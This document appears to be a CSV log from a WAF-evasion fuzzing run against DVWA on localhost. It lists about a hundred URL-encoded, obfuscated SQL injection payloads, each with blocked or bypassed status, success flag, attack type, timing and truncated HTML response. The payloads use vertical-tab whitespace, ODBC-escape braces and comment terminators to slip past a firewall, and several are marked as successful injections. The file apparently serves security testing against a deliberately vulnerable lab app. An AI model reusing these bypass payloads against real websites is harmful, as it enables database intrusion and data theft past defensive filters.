Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@=1+or%0b!+{x%0b(select%0b1)}=1=+(not+true)%0bor%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.034,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||+!%0b{x%0b(select+1)}=1=+(!%0b{a%0b1}=1)+||%27,Bypassed,No,None,Unknown,0.0276,72.35,No,500,
0%27<@!=.1+or%0b{a+1}=1%0blike+1%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0276,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or+!%7efalse%0bis+false+||',Bypassed,No,None,booleanAtk,0.054,72.35,No,500,
0'<@=1+or%0b!+{a%0b1}=1=%0b(!%0b{`if`+1}=1)%23,Bypassed,No,None,piggyAtk,0.0318,72.35,No,500,
0'<@!=.1+||+not+{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1)+or',Blocked,No,None,Unknown,0.0196,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+or%0b!+{a+1}=1=%0b(!%0b{a+1}=1)+||',Bypassed,No,None,Unknown,0.0213,72.42,No,500,
0'<@=.1%0b||+not%0b{`if`%0b1}=1=+(!%0b{`if`%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0235,72.49,No,500,
0'<@=1+or+!+{x%0b(select+1)}=1=%0b(not+{x+(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0131,72.49,No,500,
0%27<@!=.1+or%0b{x%0b(select%0b1)}=1+like%0b{x+(select%0b1)}=1+||',Bypassed,No,None,Unknown,0.0174,72.49,No,500,
0%27<@!=1.%0b||+!%0b{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.038,72.53,No,500,
0'<@=1+||%0b!+{`if`+1}=1=+(not+{x+(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.0135,72.53,No,500,
0'<@=1.%0b||%0bnot~false=+(not%0btrue)+or%27,Bypassed,No,None,booleanAtk,0.0453,72.53,No,500,
0%27<@!=.1+||%0bnot%0b{x%0b(select+1)}=1=+(!%0b{x+(select+1)}=1)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0257,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||%0bnot%0b1=+(not+{x%0b(select%0b1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.0578,72.53,No,500,
0'<@!=1+or%0b!+{x%0b(select+1)}=1=%0b(!%0b1)+or%27,Bypassed,No,None,Unknown,0.0541,72.53,No,500,
0'<@!=1+or%0bnot+{`if`+1}=1=%0b(!%0b1)+||',Bypassed,No,None,Unknown,0.0358,72.53,No,500,
0%27<@!=1+or%0bnot+true=%0b(!+{x%0b(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0442,72.35,No,500,
0%27<@!=1+||%0bnot%0b{a+1}=1=%0b(!+{`if`+1}=1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0301,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0bor%0bnot+{x+(select%0b1)}=1=%0b(!%0b{x+(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0266,72.35,No,500,
0'<@=1%0b||%0b!%0b{x+(select%0b1)}=1=+(not+{x+(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.026,72.35,No,500,
0'<@=.1%0bor%0bnot+{x%0b(select+1)}=1=+(!+{x+(select%0b1)}=1)--+,Bypassed,No,None,piggyAtk,0.0277,72.35,No,500,
0'<@=.1+||%0bnot+{`if`+1}=1=+(not%0b{x+(select%0b1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.0171,72.35,No,500,
0'||%0b!@<@%0b||%0b{a%0b1}=1%0blike+1+||',Bypassed,No,None,Unknown,0.0218,72.35,No,500,
0'<@!=1.+or%0b!+{x+(select+1)}=1=+(not+{x+(select+1)}=1)+||',Blocked,No,None,Unknown,0.0262,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1%0b||+!+{`if`+1}=1=%0b(not~false)%0bor%27,Bypassed,No,None,booleanAtk,0.0255,72.35,No,500,
0%27<@!=.1+or+not+true=%0b(!%0b{`if`+1}=1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0239,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor+!%0b{a+1}=1=+(not%0b{`if`%0b1}=1)--+,Bypassed,No,None,piggyAtk,0.0278,72.35,No,500,
0'<@=.1+or%0b!+{x%0b(select+1)}=1=%0b(!+{a%0b1}=1)--+,Bypassed,No,None,piggyAtk,0.0267,72.35,No,500,
0'<@=1+||%0b!%0b{`if`+1}=1=+(!%0b{a%0b1}=1)+or',Bypassed,No,None,Unknown,0.0233,72.35,No,500,
0'<@!=1+||+not+{x+(select%0b1)}=1=+(not%0b{x+(select%0b1)}=1)%0bor%27,Blocked,No,None,Unknown,0.0315,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||%0bnot+{x+(select%0b1)}=1=%0b(0)+||',Blocked,No,None,Unknown,0.0137,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0bor+not%7e0=%0b(!%0b{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0157,72.35,No,500,
0'<@=1.+||%0bnot%0b{x+(select%0b1)}=1=+(not%0b{x%0b(select%0b1)}=1)+or',Blocked,No,None,Unknown,0.0141,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0b||+{a+1}=1+like%0btrue+or',Bypassed,No,None,booleanAtk,0.0228,72.35,No,500,
0'<@=1%0b||+not+{a%0b1}=1=%0b(not+{a+1}=1)%23,Bypassed,No,None,piggyAtk,0.0288,72.35,No,500,
0%27<@=1+||+not%0b{`if`%0b1}=1=+(not+{x+(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0321,72.35,No,500,
0'<@=1%0bor+not%0b{a+1}=1=%0b(not%7e0)%0bor%27,Bypassed,No,None,Unknown,0.0213,72.35,No,500,
0'<@!=1%0bor+{`if`+1}=1%0blike+{a%0b1}=1+or',Bypassed,No,None,Unknown,0.0164,72.35,No,500,
0%27<@=1+or+not%0b{a+1}=1=+(not%0b{`if`%0b1}=1)%0bor',Bypassed,No,None,Unknown,0.0427,72.35,No,500,
0'<@!=1%0bor%0bnot%0b{x+(select%0b1)}=1=%0b(not+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0221,72.35,No,500,
0%27<@!=1.+or%0b!%0b1=%0b(not+{`if`+1}=1)%0b||',Bypassed,No,None,Unknown,0.0297,72.35,No,500,
0%27<@!=.1%0bor+!+true+is+false+or',Bypassed,No,None,booleanAtk,0.012,72.35,No,500,
0'<@=.1%0bor+not+{x+(select%0b1)}=1=%0b(!+{x+(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0206,72.35,No,500,
0%27<@!=1+||+not+{`if`%0b1}=1=%0b(not%0b{x+(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0358,72.35,No,500,
0%27<@=.1+||+!+{x%0b(select+1)}=1=%0b(0)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0586,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||+1+like+{`if`+1}=1+||',Bypassed,No,None,Unknown,0.0335,72.35,No,500,
0%27<@!=1%0b||+not%0btrue+is+false+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0291,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or%0b{x%0b(select+1)}=1%0blike+{x+(select%0b1)}=1+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0358,72.42,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or+not%0b{`if`+1}=1=%0b(not+{a+1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0276,72.49,No,500,
0'<@=1+or+not%0b{x%0b(select+1)}=1=+(!%0b{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0263,72.49,No,500,
0'<@=.1+or+!~0=+(not~false)%0bor',Blocked,No,None,booleanAtk,0.0198,72.51,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.%0bor%0b!%0b1=%0b(false)%0bor%27,Bypassed,No,None,booleanAtk,0.0243,72.53,No,500,
0'<@=1%0bor+!+{a+1}=1=%0b(not%0b{x%0b(select%0b1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.0431,72.53,No,500,
0'<@!=1+||+!+{x+(select+1)}=1=+(!~0)%0b||',Blocked,No,None,Unknown,0.0147,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+||%0bnot+{`if`+1}=1=+(not%0b{x+(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0286,72.53,No,500,
0'<@=.1+or+not%0btrue=%0b(not+{x+(select%0b1)}=1)+||%27,Bypassed,No,None,booleanAtk,0.0208,72.53,No,500,
0'<@=1.+||%0bnot+1=%0b(!%0b1)%0bor',Bypassed,No,None,Unknown,0.0322,72.53,No,500,
0'<@=.1+or+{`if`%0b1}=1%0blike+true%23,Bypassed,No,None,piggyAtk,0.0332,72.53,No,500,
0'<@=1.%0b||+not%0b{`if`%0b1}=1=%0b(!+{x+(select%0b1)}=1)+||%27,Bypassed,No,None,Unknown,0.0493,72.53,No,500,
0'||%0b@<@.+||+false=%0b(!%0btrue)%0bor%27,Bypassed,No,None,booleanAtk,0.0561,72.53,No,500,
0'<@=1.%0b||%0bnot%0b{a+1}=1=%0b(not~false)%23,Bypassed,No,None,piggyAtk,0.0473,72.53,No,500,
0%27<@=1.+||+!+{x%0b(select+1)}=1=+(!+{x+(select%0b1)}=1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.05,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor+!+{a+1}=1=+(not+1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0315,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or%0bnot%0b{x%0b(select+1)}=1=+(!+{`if`%0b1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.024,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or%0bnot%0b{`if`%0b1}=1=+(!%0b{x+(select+1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.0302,72.53,No,500,
0%27<@!=1%0b||+!%0b{x%0b(select+1)}=1=%0b(not~false)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0268,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0b||%0b!%0b{a+1}=1=%0b(!%0b{a+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.026,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'or%0b!@<@.%0b||+not+{a%0b1}=1=+(!%0b{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0243,72.35,No,500,
0%27<@!=.1%0b||+not%0b{x%0b(select%0b1)}=1=+(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0228,72.35,No,500,
0'||+@<@.%0bor%0bnot%0b{x+(select+1)}=1=+(!~0)%0b||%27,Bypassed,No,None,Unknown,0.026,72.35,No,500,
0%27<@=.1+or+false=%0b(!+{x+(select%0b1)}=1)+||',Bypassed,No,None,booleanAtk,0.0247,72.35,No,500,
0'<@=1+or+!%0b{x+(select+1)}=1=+(not+{x+(select%0b1)}=1)--+,Bypassed,No,None,piggyAtk,0.0344,72.35,No,500,
0%27or+!@<@%0b||%0b1+like+1+or',Bypassed,No,None,Unknown,0.03,72.35,No,500,
0'<@!=1%0bor%0b!%0b{x+(select%0b1)}=1=%0b(!%0b{`if`+1}=1)+||%27,Bypassed,No,None,Unknown,0.026,72.35,No,500,
0%27<@=1.+or+not+{a+1}=1=+(false)+||',Bypassed,No,None,booleanAtk,0.0271,72.35,No,500,
0'<@!=1+||+not~false=+(not+{a+1}=1)+||',Blocked,No,None,Unknown,0.0182,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0b||+{a%0b1}=1%0blike%0b{`if`+1}=1%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0212,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0bor+not%0b{a%0b1}=1=%0b(not%0b{x+(select%0b1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0213,72.35,No,500,
0'<@=1.+or+not~0=%0b(!+{a+1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0216,72.35,No,500,
0%27<@=.1%0b||+!%0b{x+(select%0b1)}=1=%0b(not+1)%0bor',Bypassed,No,None,Unknown,0.0235,72.35,No,500,
0%27<@!=.1%0b||+not+{x+(select+1)}=1=+(not+{x+(select%0b1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0227,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0b||%0bnot%0b{a%0b1}=1=+(!+{a+1}=1)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0231,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||%0bnot%7efalse=+(!%0b{x+(select+1)}=1)%23,Blocked,No,None,piggyAtk,0.0303,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+||%0bnot+{x%0b(select%0b1)}=1=+(!+{x%0b(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0267,72.35,No,500,
0%27||%0b@<@.+||%0bnot+{a+1}=1=+(!%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0201,72.35,No,500,
0'<@!=1.+||+!%0b{`if`%0b1}=1=+(!+{x%0b(select%0b1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0222,72.35,No,500,
0'<@=1+or+!%0b{a+1}=1=+(!+true)+or',Blocked,No,None,booleanAtk,0.0148,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27or+1<@.+or+true%0blike%0b{x%0b(select+1)}=1+or',Bypassed,No,None,booleanAtk,0.0337,72.35,No,500,
0%27||+!@<@.%0bor+!%0b{a+1}=1=%0b(!~0)%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0197,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||+!+{a+1}=1=+(!%7e0)%0bor',Bypassed,No,None,Unknown,0.0237,72.35,No,500,
0'<@!=1%0b||%0bnot+true=+(not%0b{x%0b(select%0b1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.013,72.35,No,500,
0'<@=.1+or+!%0b{x+(select+1)}=1=+(not+{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0217,72.35,No,500,
0%27<@=1.+or%0b!+true=%0b(not+{x%0b(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.017,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor%0bnot%0b1=+(not+{`if`%0b1}=1)+||%27,Bypassed,No,None,Unknown,0.0288,72.35,No,500,
0%27<@=1.+or+not+{x+(select%0b1)}=1=+(!%0b{a+1}=1)%23,Blocked,No,None,piggyAtk,0.0396,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+or+!~0=+(!+true)+or',Bypassed,No,None,booleanAtk,0.0427,72.35,No,500,
0%27<@=.1+or%0bnot%7efalse=+(not+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,booleanAtk,0.0144,72.35,No,500,
0%27<@!=1%0b||+not%0b{`if`+1}=1=+(!+{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0271,72.35,No,500,
0'||%0b@<@.%0bor%0b{x+(select+1)}=1%0blike+{x%0b(select%0b1)}=1+or',Bypassed,No,None,Unknown,0.0163,72.49,No,500,
0'<@=1.+||%0bnot%7e0=%0b(!%0b{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0279,72.49,No,500,
0%27||+!@<@.+||+not%0b{`if`+1}=1=+(not%0b{a%0b1}=1)+||',Bypassed,No,None,Unknown,0.0398,72.51,No,500,
0%27<@!=.1%0b||%0b!+{x%0b(select+1)}=1=%0b(not+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0613,72.53,No,500,
0%27<@=1.%0bor%0b!+{x+(select%0b1)}=1=%0b(not+{x%0b(select+1)}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0209,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or%0b!%0b{`if`%0b1}=1%0bis%0bfalse%0b||',Bypassed,No,None,booleanAtk,0.0201,72.53,No,500,
